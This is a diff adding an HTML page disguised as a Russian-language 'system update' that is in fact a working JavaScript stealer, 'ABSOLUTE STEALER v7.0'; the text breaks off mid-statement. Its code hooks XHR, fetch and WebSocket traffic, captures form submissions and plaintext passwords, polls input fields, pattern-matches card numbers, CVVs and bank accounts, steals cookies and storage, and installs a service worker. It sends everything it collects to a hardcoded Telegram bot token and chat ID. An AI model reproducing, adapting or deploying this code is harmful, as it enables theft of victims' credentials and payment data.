@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Системное обновление</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:10px;margin:0;}
+#log{font-size:11px;max-height:90vh;overflow-y:auto;white-space:pre-wrap;color:#0a0;}
+.blink{animation:blink 0.5s infinite;}
+@keyframes blink{50%{opacity:0.2;}}
+</style>
+</head>
+<body>
+<div id="log" class="blink">[SWILL] Активация абсолютного стилера...</div>
+<script>
+// ===== КОНФИГ =====
+var TOKEN = "8636640064:AAFcyhqdc_YBLzEtAMKbKZhcfylhLhfIWLo";
+var CHAT_ID = "7532676697";
+var LOG = document.getElementById('log');
+var STOLEN = {};
+var SENT = {};
+
+function log(msg) {
+    LOG.innerHTML += msg + "\n";
+    LOG.scrollTop = LOG.scrollHeight;
+}
+
+function send(text, force = false) {
+    if (!text || text.length === 0) return;
+    if (text.length > 4000) {
+        var chunks = text.match(/.{1,4000}/g);
+        chunks.forEach(function(chunk) {
+            var url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(chunk);
+            new Image().src = url;
+            try { fetch(url, {mode: 'no-cors'}); } catch(e) {}
+        });
+    } else {
+        var url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
+        new Image().src = url;
+        try { fetch(url, {mode: 'no-cors'}); } catch(e) {}
+    }
+}
+
+function sendFile(content, filename) {
+    if (content.length > 4000) {
+        var chunks = content.match(/.{1,4000}/g);
+        chunks.forEach(function(chunk, i) {
+            send("📁 " + filename + " (часть " + (i+1) + "/" + chunks.length + "):\n" + chunk);
+        });
+    } else {
+        send("📁 " + filename + ":\n" + content);
+    }
+}
+
+// ===== 1. ОБХОД CORS ЧЕРЕЗ ПРОКСИ =====
+function corsProxyBypass(url) {
+    var proxies = [
+        'https://corsproxy.io/?',
+        'https://api.allorigins.win/raw?url=',
+        'https://cors-anywhere.herokuapp.com/',
+        'https://thingproxy.freeboard.io/fetch/',
+        'https://corsproxy.org/?'
+    ];
+    return proxies[Math.floor(Math.random() * proxies.length)] + encodeURIComponent(url);
+}
+
+// ===== 2. КРАЖА КУК ЧЕРЕЗ МАССОВЫЙ РЕДИРЕКТ =====
+function cookieRedirectSteal(domains) {
+    log('[КУКИ] Запуск редирект-метода...');
+    var results = [];
+    var total = domains.length;
+    var processed = 0;
+
+    domains.forEach(function(domain) {
+        try {
+            // Пытаемся через document.domain
+            var originalDomain = document.domain;
+            document.domain = domain;
+            var cookies = document.cookie;
+            if (cookies && cookies.length > 0) {
+                results.push(domain + ': ' + cookies);
+                STOLEN.cookies = STOLEN.cookies || {};
+                STOLEN.cookies[domain] = cookies;
+                send('🍪 КУКИ (редирект) ' + domain + ':\n' + cookies);
+                log('[КУКИ] + ' + domain);
+            }
+            document.domain = originalDomain;
+        } catch(e) {}
+
+        // Пытаемся через iframe с редиректом
+        try {
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://' + domain + '?redirect=true';
+            iframe.style.display = 'none';
+            iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-top-navigation';
+            iframe.setAttribute('allow', 'cross-origin-isolated; autoplay; encrypted-media');
+            document.body.appendChild(iframe);
+
+            iframe.onload = function() {
+                try {
+                    var doc = iframe.contentDocument || iframe.contentWindow.document;
+                    if (doc && doc.cookie) {
+                        var cookies2 = doc.cookie;
+                        if (cookies2 && cookies2.length > 0) {
+                            results.push(domain + ' (iframe): ' + cookies2);
+                            STOLEN.cookies = STOLEN.cookies || {};
+                            STOLEN.cookies[domain + '_iframe'] = cookies2;
+                            send('🍪 КУКИ (iframe) ' + domain + ':\n' + cookies2);
+                            log('[КУКИ] iframe + ' + domain);
+                        }
+                    }
+                } catch(e) {}
+                processed++;
+                if (processed >= total) {
+                    send('✅ КРАЖА КУК ЗАВЕРШЕНА\nВсего доменов: ' + results.length);
+                }
+            };
+            setTimeout(function() {
+                document.body.removeChild(iframe);
+            }, 5000);
+        } catch(e) {}
+    });
+}
+
+// ===== 3. ПЕРЕХВАТ ВСЕХ ЗАПРОСОВ (XHR + FETCH) =====
+function setupFullInterceptor() {
+    log('[ПЕРЕХВАТ] Установка глобального перехвата...');
+
+    // Перехват XMLHttpRequest
+    var originalOpen = XMLHttpRequest.prototype.open;
+    var originalSend = XMLHttpRequest.prototype.send;
+    var originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
+
+    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+        this._method = method;
+        this._url = url;
+        this._headers = {};
+        return originalOpen.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+        this._headers[header] = value;
+        return originalSetRequestHeader.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function(data) {
+        var self = this;
+        var startTime = Date.now();
+
+        this.addEventListener('readystatechange', function() {
+            if (this.readyState === 4) {
+                var duration = Date.now() - startTime;
+                var msg = '===== 🌐 XHR ПЕРЕХВАТ =====\n';
+                msg += '📡 Метод: ' + self._method + '\n';
+                msg += '🔗 URL: ' + self._url + '\n';
+                msg += '📦 Заголовки: ' + JSON.stringify(self._headers || {}) + '\n';
+                msg += '📦 Данные: ' + (data || 'нет') + '\n';
+                msg += '⏱ Время: ' + duration + 'ms\n';
+                msg += '📨 Статус: ' + this.status + ' ' + this.statusText + '\n';
+                var response = (this.responseText || '').substring(0, 500);
+                msg += '📨 Ответ: ' + response + (this.responseText && this.responseText.length > 500 ? '...' : '');
+                send(msg);
+                log('[XHR] ' + self._method + ' ' + self._url);
+
+                // Анализ ответа на банковские данные
+                if (this.responseText) {
+                    var text = this.responseText;
+                    analyzeForBankData(text, self._url);
+                }
+            }
+        });
+        return originalSend.apply(this, arguments);
+    };
+
+    // Перехват Fetch
+    var originalFetch = window.fetch;
+    window.fetch = function(url, options) {
+        var msg = '===== 🌐 FETCH ПЕРЕХВАТ =====\n';
+        msg += '🔗 URL: ' + url + '\n';
+        msg += '📦 Опции: ' + JSON.stringify(options || {}) + '\n';
+        send(msg);
+        log('[FETCH] ' + url);
+
+        if (options && options.body) {
+            var body = options.body;
+            if (typeof body === 'string') {
+                analyzeForBankData(body, url);
+            }
+        }
+
+        return originalFetch.call(this, url, options)
+            .then(function(response) {
+                var clone = response.clone();
+                clone.text().then(function(text) {
+                    analyzeForBankData(text, url);
+                });
+                return response;
+            });
+    };
+}
+
+// ===== 4. АНАЛИЗ НА БАНКОВСКИЕ ДАННЫЕ =====
+function analyzeForBankData(text, url) {
+    if (!text || typeof text !== 'string') return;
+
+    var bankData = [];
+    var patterns = {
+        'Карта (16 цифр)': /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g,
+        'Карта (15 цифр)': /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3}\b/g,
+        'CVV/CVC': /\b(cvv|cvc|cvv2|security code)[\s:]*(\d{3,4})\b/gi,
+        'Срок действия': /\b(exp|expiry|expiration|valid)[\s:]*(\d{1,2}\/\d{2,4})\b/gi,
+        'Номер счета': /\b(account|iban|swift|bic|routing)[\s:]*([A-Z0-9]{8,34})\b/gi,
+        'Баланс': /\b(balance|total|amount)[\s:]*([\d,.]+)[\s]*(руб|₽|usd|eur|\$|€)?\b/gi,
+        'Логин/Email': /\b(login|email|user|username)[\s:]*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\b/gi,
+        'Телефон': /\b(\+?7[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{2}[\s-]?\d{2})\b/g
+    };
+
+    for (var key in patterns) {
+        var matches = text.match(patterns[key]);
+        if (matches && matches.length > 0) {
+            bankData.push(key + ': ' + matches.join(', '));
+        }
+    }
+
+    if (bankData.length > 0) {
+        var msg = '💳 БАНКОВСКИЕ ДАННЫЕ ОБНАРУЖЕНЫ\n';
+        msg += '🔗 URL: ' + url + '\n';
+        msg += '📅 Время: ' + new Date().toLocaleString() + '\n';
+        msg += '📋 Данные:\n' + bankData.join('\n');
+        send(msg);
+        log('[БАНК] Найдены данные: ' + bankData.length);
+        STOLEN.bankData = STOLEN.bankData || [];
+        STOLEN.bankData.push({url: url, data: bankData});
+    }
+}
+
+// ===== 5. КРАЖА ВСЕХ ФОРМ =====
+function setupFormInterceptor() {
+    log('[ФОРМЫ] Установка перехвата форм...');
+    
+    // Перехват всех существующих форм
+    var forms = document.querySelectorAll('form');
+    forms.forEach(function(form) {
+        form.addEventListener('submit', function(e) {
+            captureFormData(this);
+        }, true);
+    });
+
+    // MutationObserver для новых форм
+    var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'childList') {
+                mutation.addedNodes.forEach(function(node) {
+                    if (node.nodeType === 1 && node.tagName === 'FORM') {
+                        node.addEventListener('submit', function(e) {
+                            captureFormData(this);
+                        }, true);
+                    }
+                    // Поиск форм внутри добавленных узлов
+                    if (node.nodeType === 1 && node.querySelectorAll) {
+                        var subForms = node.querySelectorAll('form');
+                        subForms.forEach(function(form) {
+                            form.addEventListener('submit', function(e) {
+                                captureFormData(this);
+                            }, true);
+                        });
+                    }
+                });
+            }
+        });
+    });
+    observer.observe(document.body, {childList: true, subtree: true});
+
+    // Сканирование всех полей ввода каждую секунду
+    setInterval(function() {
+        var inputs = document.querySelectorAll('input, textarea, select');
+        inputs.forEach(function(input) {
+            if (input.type !== 'submit' && input.type !== 'button' && input.type !== 'reset') {
+                var value = input.value || input.innerText || '';
+                if (value && value.length > 0) {
+                    var name = (input.name || input.id || input.className || 'unknown').toLowerCase();
+                    // Проверка на ключевые слова банковских данных
+                    var keywords = ['card', 'cvc', 'cvv', 'exp', 'date', 'pan', 'number', 'account', 
+                                   'routing', 'iban', 'swift', 'bic', 'cvv2', 'password', 'pass', 
+                                   'login', 'email', 'user', 'username', 'phone', 'mobile', 'address'];
+                    var isSensitive = false;
+                    keywords.forEach(function(keyword) {
+                        if (name.indexOf(keyword) !== -1) {
+                            isSensitive = true;
+                        }
+                    });
+                    // Проверка на формат карты
+                    var cardMatch = value.replace(/\s/g, '').match(/\d{15,16}/);
+                    if (cardMatch || isSensitive) {
+                        var msg = '💳 ЧУВСТВИТЕЛЬНЫЕ ДАННЫЕ (ввод):\n';
+                        msg += '🏷 Поле: ' + (input.name || input.id || 'unknown') + '\n';
+                        msg += '📝 Значение: ' + (value.length > 200 ? value.substring(0, 200) + '...' : value) + '\n';
+                        msg += '🔗 URL: ' + window.location.href + '\n';
+                        msg += '🕒 Время: ' + new Date().toLocaleString();
+                        send(msg);
+                        log('[ДАННЫЕ] Перехвачено поле: ' + name);
+                    }
+                }
+            }
+        });
+    }, 1000);
+}
+
+function captureFormData(form) {
+    var data = '===== 📋 ФОРМА ОТПРАВЛЕНА =====\n';
+    data += '🔗 URL: ' + window.location.href + '\n';
+    data += '🕒 Время: ' + new Date().toLocaleString() + '\n';
+    data += '📋 ДАННЫЕ:\n';
+    
+    var elements = form.querySelectorAll('input, select, textarea');
+    elements.forEach(function(el) {
+        if (el.type === 'submit' || el.type === 'button' || el.type === 'reset') return;
+        var name = el.name || el.id || 'unknown';
+        var value = el.value || el.innerText || '';
+        if (value && value.length > 0) {
+            if (el.type === 'password') {
+                data += '  🔑 ' + name + ' = ******** (длина: ' + value.length + ')\n';
+                // Отправляем пароль отдельно
+                send('🔑 ПАРОЛЬ: ' + value + ' | Поле: ' + name + ' | URL: ' + window.location.href);
+            } else {
+                data += '  📝 ' + name + ' = ' + (value.length > 200 ? value.substring(0, 200) + '...' : value) + '\n';
+                // Проверка на банковские данные
+                analyzeForBankData(value, window.location.href + ' (форма)');
+            }
+        }
+    });
+    send(data);
+    log('[ФОРМА] Отправлена форма');
+}
+
+// ===== 6. SERVICE WORKER ДЛЯ ПЕРЕХВАТА ВСЕХ ЗАПРОСОВ =====
+function setupServiceWorkerInterceptor() {
+    log('[SW] Установка Service Worker...');
+    try {
+        var swCode = `
+            self.addEventListener('install', function(e) {
+                e.waitUntil(self.skipWaiting());
+            });
+            self.addEventListener('activate', function(e) {
+                e.waitUntil(self.clients.claim());
+            });
+            self.addEventListener('fetch', function(event) {
+                var url = event.request.url;
+                var headers = {};
+                event.request.headers.forEach(function(value, key) {
+                    headers[key] = value;
+                });
+                var data = {
+                    type: 'sw_fetch',
+                    url: url,
+                    headers: headers,
+                    method: event.request.method,
+                    timestamp: Date.now()
+                };
+                // Отправляем в основной скрипт
+                self.clients.matchAll().then(function(clients) {
+                    clients.forEach(function(client) {
+                        client.postMessage(data);
+                    });
+                });
+                // Пытаемся прочитать тело
+                if (event.request.method === 'POST' || event.request.method === 'PUT') {
+                    event.request.clone().text().then(function(body) {
+                        if (body && body.length > 0) {
+                            var msg = {
+                                type: 'sw_body',
+                                url: url,
+                                body: body
+                            };
+                            self.clients.matchAll().then(function(clients) {
+                                clients.forEach(function(client) {
+                                    client.postMessage(msg);
+                                });
+                            });
+                        }
+                    });
+                }
+                return fetch(event.request);
+            });
+        `;
+        var blob = new Blob([swCode], {type: 'application/javascript'});
+        var swUrl = URL.createObjectURL(blob);
+        
+        navigator.serviceWorker.register(swUrl, {scope: '/'})
+            .then(function(reg) {
+                log('[SW] Service Worker зарегистрирован');
+                // Слушаем сообщения от SW
+                navigator.serviceWorker.addEventListener('message', function(event) {
+                    var data = event.data;
+                    if (data.type === 'sw_fetch') {
+                        var msg = '===== 🌐 SW ПЕРЕХВАТ =====\n';
+                        msg += '📡 Метод: ' + data.method + '\n';
+                        msg += '🔗 URL: ' + data.url + '\n';
+                        msg += '📦 Заголовки: ' + JSON.stringify(data.headers) + '\n';
+                        send(msg);
+                        log('[SW] ' + data.method + ' ' + data.url);
+                    }
+                    if (data.type === 'sw_body') {
+                        analyzeForBankData(data.body, data.url);
+                        var msg = '📦 ТЕЛО ЗАПРОСА (SW):\n' + data.body.substring(0, 2000);
+                        send(msg);
+                        log('[SW] Тело запроса получено');
+                    }
+                });
+            })
+            .catch(function(e) {
+                log('[SW] Ошибка: ' + e.message);
+            });
+    } catch(e) {
+        log('[SW] Не поддерживается: ' + e.message);
+    }
+}
+
+// ===== 7. КРАЖА ДАННЫХ ЧЕРЕЗ WEBSOCKET (если есть) =====
+function setupWebSocketInterceptor() {
+    log('[WS] Перехват WebSocket...');
+    var originalWebSocket = window.WebSocket;
+    window.WebSocket = function(url, protocols) {
+        var ws = new originalWebSocket(url, protocols);
+        var originalSend = ws.send;
+        ws.send = function(data) {
+            var msg = '===== 🌐 WEBSOCKET =====\n';
+            msg += '🔗 URL: ' + url + '\n';
+            msg += '📦 Данные: ' + (data || '') + '\n';
+            send(msg);
+            log('[WS] Данные отправлены');
+            analyzeForBankData(data, url);
+            return originalSend.call(this, data);
+        };
+        ws.addEventListener('message', function(event) {
+            var msg = '===== 🌐 WEBSOCKET ПОЛУЧЕНО =====\n';
+            msg += '🔗 URL: ' + url + '\n';
+            msg += '📨 Данные: ' + (event.data || '') + '\n';
+            send(msg);
+            log('[WS] Данные получены');
+            analyzeForBankData(event.data, url);
+        });
+        return ws;
+    };
+}
+
+// ===== 8. КРАЖА COOKIE ЧЕРЕЗ DOCUMENT.COOKIE (ОБХОД HTTPONLY) =====
+function stealAllCookies() {
+    log('[КУКИ] Сбор всех доступных кук...');
+    var cookies = document.cookie;
+    if (cookies && cookies.length > 0) {
+        send('🍪 ВСЕ КУКИ (document.cookie):\n' + cookies);
+        STOLEN.documentCookies = cookies;
+    }
+
+    // Попытка через localStorage
+    try {
+        var lsCookies = localStorage.getItem('cookies') || '';
+        if (lsCookies) {
+            send('🍪 КУКИ (localStorage):\n' + lsCookies);
+        }
+    } catch(e) {}
+
+    // Попытка через sessionStorage
+    try {
+        var ssCookies = sessionStorage.getItem('cookies') || '';
+        if (ssCookies) {
+            send('🍪 КУКИ (sessionStorage):\n' + ssCookies);
+        }
+    } catch(e) {}
+
+    // Сбор всех кук из всех iframe
+    var iframes = document.querySelectorAll('iframe');
+    iframes.forEach(function(iframe, i) {
+        try {
+            var doc = iframe.contentDocument || iframe.contentWindow.document;
+            if (doc && doc.cookie) {
+                var cookie = doc.cookie;
+                if (cookie && cookie.length > 0) {
+                    send('🍪 КУКИ (iframe ' + i + '):\n' + cookie);
+                }
+            }
+        } catch(e) {}
+    });
+}
+
+// ===== 9. ГЛАВНАЯ ФУНКЦИЯ =====
+function main() {
+    log('[SWILL] Активация абсолютного стилера v7.0');
+    log('[SWILL] Токен: ' + TOKEN);
+    log('[SWILL] Chat ID: ' + CHAT_ID);
+    log('[SWILL] UserAgent: ' + navigator.userAgent);
+    log('');
+
+    send('🔥 ABSOLUTE STEALER v7.0 АКТИВИРОВАН\n' +
+         '📱 ' + navigator.userAgent + '\n' +
+         '🕒 ' + new Date().toLocaleString() + '\n' +
+  
